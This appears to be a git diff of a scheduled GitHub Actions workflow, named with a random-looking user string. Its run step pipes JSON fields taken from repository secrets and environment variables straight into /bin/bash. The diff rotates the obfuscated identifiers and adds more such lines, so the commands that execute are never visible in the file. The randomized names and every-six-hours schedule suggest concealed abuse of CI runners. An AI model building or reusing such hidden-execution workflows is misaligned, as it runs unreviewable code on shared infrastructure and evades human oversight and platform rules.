@@ -1,11 +1,9 @@
 name: zhoujinwei2345
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
-
-jobs:  # 30123
+    - cron: '2 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,11 +11,16 @@ jobs:  # 30123
       - uses: actions/checkout@v4
       - name: zhoujinwei2345
         env:
-          lxswq22: ${{ secrets.lxswq22 }}
+          alqq81: ${{ secrets.alqq81 }}
         run: |
-          echo $lxswq22 | jq -r .rxn355 | /bin/bash
-          echo $fyk8 | jq -r .waht10 | /bin/bash
-          echo $uu5390 | jq -r .ovknm3272 | /bin/bash
-          echo $t63539 | jq -r .hx24695 | /bin/bash
-          echo $yjy9111 | jq -r .scdnz639 | /bin/bash
+          echo $alqq81 | jq -r .qx52 | /bin/bash
+          echo $fj65883 | jq -r .ea15554 | /bin/bash
+          echo $rrvj2 | jq -r .rney4293 | /bin/bash
+          echo $z5192 | jq -r .resm1 | /bin/bash
+          echo $dgfz562 | jq -r .bqqgz2 | /bin/bash
+          echo $f36 | jq -r .dqlal2 | /bin/bash
+          echo $xrltx2 | jq -r .t5178 | /bin/bash
+          echo $bccdc546 | jq -r .s661 | /bin/bash
+          echo $ibx5296 | jq -r .qrh0050 | /bin/bash
+          echo $l05 | jq -r .rz378 | /bin/bash
 
